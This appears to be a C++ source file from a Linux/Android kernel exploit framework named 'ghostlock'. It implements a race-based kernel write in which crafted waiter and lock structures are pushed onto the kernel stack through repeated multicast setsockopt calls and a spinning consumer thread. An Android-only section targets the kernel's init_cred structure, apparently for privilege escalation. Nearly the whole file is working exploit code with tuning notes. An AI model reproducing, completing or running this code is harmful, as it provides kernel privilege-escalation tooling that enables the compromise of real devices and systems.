#include <netinet/in.h>
#include <ctime>
#include <unistd.h>

#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "common.h"
#include "memory/payload_builder.h"
#include "route/route_status.h"
#include "session/exploit_session.hpp"
#include "kernel/target.h"

using namespace ghostlock;

namespace ghostlock::route {
    namespace {
        /* Poison/walk repetition. The values are the ones this geometry was
         * measured with on a 6.1 compact-waiter kernel: the arm only starts once
         * the earlier copies have overwritten each other, and the waiter thread
         * spins on yield (no syscall) between the copy and the walk so the
         * poisoned frame survives. A profile may override them through
         * route.multicast_waiter {attempts, arm_sequence, arm_hold}; 0 keeps the
         * default. */
        constexpr int32_t kMulticastMaxAttempts = 128;
        constexpr int32_t kMulticastArmSequence = 16;
        constexpr int32_t kMulticastArmHold = 20000;

        int32_t mcast_from_profile(uint32_t value, int32_t fallback) {
            return value > 0 ? static_cast<int32_t>(value) : fallback;
        }
    } // namespace

    route::RouteStatus do_kernel5_fake_lock_route(const memory::WriteRequest *request) {
        (void) request;
        route::RouteStatus status = {.code = ROUTE_RETRYABLE};
        profile::MulticastWaiterLayout layout =
                session::g_exploit_session.profile.multicast_layout();
        /* Absent geometry (e.g. an underivable waiter_off) is a hard refusal:
         * one-shot multicast must never guess a landing. */
        if (!layout.buffer_size || !layout.waiter_offset || !layout.task_offset ||
            !layout.lock_offset) {
            status.step = 58;
            status.error_number = EINVAL;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            pr_warning("multicast geometry incomplete (waiter_off not provided)\n");
            return status;
        }
        const size_t stamp_size = *layout.buffer_size;
        /* VLA size comes from the validated profile geometry; the encode step
     * rejects an undersized buffer before any indexed write. */
    __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
        memset(stamp, 0, sizeof(stamp));
        if (!memory::encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(stamp), stamp_size},
            static_cast<size_t>(*layout.waiter_offset), *layout.task_offset,
            *layout.lock_offset,
            (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock))) {
            status.step = 59;
            status.error_number = EOVERFLOW;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            pr_warning("multicast byte injection rejected: waiter=%zu task=%zu "
                       "lock=%zu buffer=%zu\n", static_cast<size_t>(*layout.waiter_offset),
                       static_cast<size_t>(*layout.task_offset),
                       static_cast<size_t>(*layout.lock_offset), stamp_size);
            return status;
        }
        uint16_t family = AF_UNSPEC;
        memcpy(stamp + 8, &family, sizeof(family));

        int32_t fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
        if (fd < 0) {
            status.step = 60;
            status.error_number = errno;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            return status;
        }
        session::g_exploit_session.race.consumer_calls.store(0);
        session::g_exploit_session.race.consumer_success.store(0);
        session::g_exploit_session.race.consumer_stop.store(0);
        session::g_exploit_session.race.route_delay_usec.store(0);
        /* The copy landing on the caller's stack is a race against skb page
         * recycling, so a single setsockopt is a single lottery ticket: one miss
         * costs the whole run, because a miss usually panics the kernel.
         * Re-poison and re-walk instead, arming from the point where the earlier
         * copies have overwritten each other. */
        const profile::McastTuning mcast =
                session::g_exploit_session.profile.mcast_tuning();
        const int32_t max_attempts =
                mcast_from_profile(mcast.attempts, kMulticastMaxAttempts);
        const int32_t arm_sequence =
                mcast_from_profile(mcast.arm_sequence, kMulticastArmSequence);
        const int32_t arm_hold = mcast_from_profile(mcast.arm_hold, kMulticastArmHold);
        int32_t stamp_result = -1;
        int32_t stamp_errno = 0;
        int32_t attempts_used = 0;
        for (int32_t attempt = 1; attempt <= max_attempts; attempt++) {
            attempts_used = attempt;
            errno = 0;
            stamp_result = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp,
                                      (socklen_t) sizeof(stamp));
            stamp_errno = errno;
            /* The copy lands before the family check, so -EADDRNOTAVAIL still
             * means the waiter shape is on the stack now. */
            if (attempt < arm_sequence ||
                (stamp_result != 0 && stamp_errno != EADDRNOTAVAIL)) {
                continue;
            }
            session::g_exploit_session.race.consumer_go.store(attempt);
            for (int32_t spin = 0; spin < arm_hold; spin++)
                __asm__ volatile("yield" ::: "memory");
            session::g_exploit_session.race.consumer_go.store(0);
            while (session::g_exploit_session.race.consumer_inflight.load())
                __asm__ volatile("yield" ::: "memory");
            if (session::g_exploit_session.race.consumer_success.load() > 0) break;
        }
        status.step = 61;
        status.error_number = stamp_errno;
        close(fd);
        status.userspace_clean = 1;
        status.kernel_disarmed = 1;
        /* Only the consumer's verified write makes this route OK: a setsockopt
         * return code merely means the copy landed, and the warm-up attempts
         * never arm the consumer at all (select_stack judges its runs the same
         * way). Reporting OK without it would let the caller skip its retry on
         * an unverified write. */
        if (session::g_exploit_session.race.consumer_success.load() > 0) {
            status.step = 0;
            status.error_number = 0;
            status.code = ROUTE_OK;
        } else {
            status.code = ROUTE_FALLBACK_SAFE;
        }
        pr_info("multicast route status=%d clean=%d/%d step=%d sockopt=%d errno=%d "
                "attempts=%d calls=%d success=%d\n",
                status.code, status.userspace_clean, status.kernel_disarmed,
                status.step, stamp_result, status.error_number, attempts_used,
                session::g_exploit_session.race.consumer_calls.load(),
                session::g_exploit_session.race.consumer_success.load());
        return status;
    }

    /* Acquire every userspace resource owned by the TCP route. No PI consumer or
 * punch operation is armed until this function has completed successfully. */
} // namespace ghostlock::route

#if defined(__ANDROID__)
#include "race/threads.hpp"
#include "route/route_policy.hpp"

namespace ghostlock::route {
    /* MulticastPolicy route hooks (Batch 4). Declared in route_policy.hpp,
     * defined here because the implementations are Android-only. The one-shot
     * route keeps its own small stack frame in
     * do_kernel5_fake_lock_route() and shares only the pure payload encoding. */
    bool MulticastPolicy::w2_fast_repair_prebuild(
        session::ExploitSession &exploit_session) noexcept {
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        (exploit_session.heap.current.base) =
                support::prepare_good_kernel_page(repair_request);
        if (!(exploit_session.heap.current.base) || !support::stash_prebuilt_page()) {
            pr_warning("W2 fast repair prebuild failed\n");
            support::discard_prebuilt_page();
            return false;
        }
        pr_info("W2 fast repair payload prebuilt\n");
        return true;
    }

    bool MulticastPolicy::w2_fast_repair_activate(
        session::ExploitSession &exploit_session) noexcept {
        if (!support::activate_prebuilt_page()) {
            pr_warning("W2 fast repair activation failed\n");
            return false;
        }
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        pr_info("W2b: firing prebuilt init_cred+8 repair\n");
        exploit_session.race.fast_repair.store(1);
        const Status repaired = race::run_main_route_threads(repair_request);
        exploit_session.race.fast_repair.store(0);
        if (!repaired) {
            pr_warning("W2 fast repair route failed\n");
            return false;
        }
        return true;
    }
} // namespace ghostlock::route
#endif
